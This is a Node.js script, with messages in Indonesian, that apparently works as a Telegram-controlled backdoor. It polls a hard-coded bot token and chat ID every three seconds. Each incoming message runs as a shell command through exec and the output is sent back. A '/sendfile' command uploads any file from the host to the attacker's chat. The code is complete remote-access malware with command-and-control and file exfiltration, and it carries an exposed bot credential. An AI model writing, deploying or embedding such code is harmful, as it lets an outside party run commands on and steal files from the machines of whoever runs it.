const fs = require("fs");
const axios = require("axios");
const { exec } = require("child_process");

const BOT_TOKEN = "7243753634:AAHawNDB21EBLpZSk0Tk_pgSTu9iS28RCIg";
const CHAT_ID = "6902958231";
const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/`;

async function sendMessage(text) {
    await axios.post(`${API_URL}sendMessage`, {
        chat_id: CHAT_ID,
        text: text,
    });
}

async function sendFile(filePath) {
    try {
        if (!fs.existsSync(filePath)) {
            await sendMessage("⚠️ File tidak ditemukan!");
            return;
        }

        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("document", fs.createReadStream(filePath));

        await axios.post(`${API_URL}sendDocument`, formData, {
            headers: formData.getHeaders(),
        });

        await sendMessage(`📂 File dikirim: ${filePath}`);
    } catch (err) {
        await sendMessage(`❌ Gagal mengirim file: ${err.message}`);
    }
}

async function handleCommand(command) {
    if (command.startsWith("/sendfile ")) {
        const filePath = command.replace("/sendfile ", "").trim();
        await sendFile(filePath);
    } else {
        exec(command, async (error, stdout, stderr) => {
            const output = error ? stderr : stdout;
            await sendMessage(output || "✅ Perintah berhasil dijalankan!");
        });
    }
}

async function getLastMessage() {
    try {
        const response = await axios.get(`${API_URL}getUpdates`);
        const messages = response.data.result;

        if (messages.length > 0) {
            const lastMessage = messages[messages.length - 1];
            const text = lastMessage.message?.text;
            if (text) {
                await handleCommand(text);
            }
        }
    } catch (err) {
        console.error("❌ Error:", err.message);
    }
}

async function main() {
    setInterval(getLastMessage, 3000);
}

main();